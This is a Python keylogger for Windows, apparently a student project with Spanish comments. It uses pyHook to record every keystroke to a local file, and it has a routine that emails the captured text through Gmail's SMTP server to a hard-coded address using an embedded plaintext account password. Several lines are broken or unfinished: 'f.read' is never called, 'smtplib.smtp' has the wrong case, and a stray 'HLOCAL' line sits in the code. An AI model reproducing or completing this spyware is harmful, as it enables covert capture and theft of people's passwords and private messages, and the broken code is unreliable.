from ctypes.wintypes import HLOCAL
from http import server
import re
import pyHook, pythoncom, sys, logging, time, datetime

carpeta_destino= 'C:\\Users\\breae\\OneDrive - Universidade da Coruña\\Escritorio\\info\\Cyber\\Keys.txt'
segundos_espera= 7
timeout= time.time()+ segundos_espera

def TimeOut():
    if time.time() > timeout:      #prueba 1
        return True
    else:
        return False
HLOCAL
def Enviar_Email():
    with open (carpeta_destino, "r+") as f:
        fecha = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data = f.read
        data = data.replace("Space", "")
        data = data.replace("\n", "")
        data = "Mensaje capturado a las: " + fecha + "\n" + data
        print(data)
        crearEmail("keylogerprueba1@gmail.com", "@lejandro11", "keylogerprueba1@gmail.com", "Nueva captura" +fecha, data)
        f.seek(0)
        f.truncate()

def crearEmail(user, passw, recep, subj, body):
    import smtplib
    mailUser=user
    mailPass=passw
    From = user
    To = recep
    Subject = subj
    Txt = body

    email = """\From: %s\nTo: %s\nSubject: %s\n\n%s""" % (From, ",".join(To), Subject, Txt)

    try:
        server=smtplib.smtp("smtp.gmail.com", 587)
        server.ehlo()
        server.starttls()
        server.login(mailUser, mailPass)
        server.sendmail(From, To, email)
        server.close()
        print("Correo enviado con exito")

    except:
        print("Correo fallido") 


def onkeyboardevent(event):
    logging.basicConfig(filename=carpeta_destino, level=logging.DEBUG, format="%(message)s")
    print("WindowName: ", event.WindowName)
    print("Window: ", event.Window)
    print("Key: ", event.Key)
    logging.log(10, event.Key)
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = onkeyboardevent
hooks_manager.HookKeyboard()

while True:
    pythoncom.PumpWaitingMessages()